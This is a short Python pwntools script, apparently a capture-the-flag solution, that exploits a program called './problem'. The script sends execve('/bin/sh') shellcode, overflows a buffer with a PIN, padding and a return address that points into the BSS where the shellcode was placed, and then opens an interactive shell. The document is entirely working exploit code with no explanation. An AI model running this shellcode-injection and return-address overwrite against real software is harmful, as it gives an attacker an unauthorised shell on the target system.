#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./problem')
else:
	io = remote()


shellcode =  "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
shellcode += "\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
io.sendlineafter(": ",shellcode)
io.sendlineafter(': ', '1234')
io.sendlineafter('?', 'd')

# PIN + junk + return to BSS where we have shellcode
payload = '1234' + "A" * 13 + p64(0x6010A0)
io.sendline(payload)

io.interactive()
